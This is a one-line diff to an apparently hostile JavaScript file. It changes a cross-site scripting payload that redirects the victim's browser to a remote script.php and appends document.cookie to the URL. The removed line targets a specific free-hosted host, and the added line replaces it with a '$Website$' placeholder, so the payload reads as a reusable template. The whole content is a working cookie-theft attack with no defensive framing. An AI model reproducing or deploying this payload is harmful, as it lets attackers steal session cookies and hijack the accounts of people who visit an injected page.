@@ -1,1 +1,1 @@
-document.location = "https://whatisdate.000webhostapp.com/script.php?cookie=" + document.cookie;
+document.location = "https:// $Website$ /script.php?cookie=" + document.cookie;
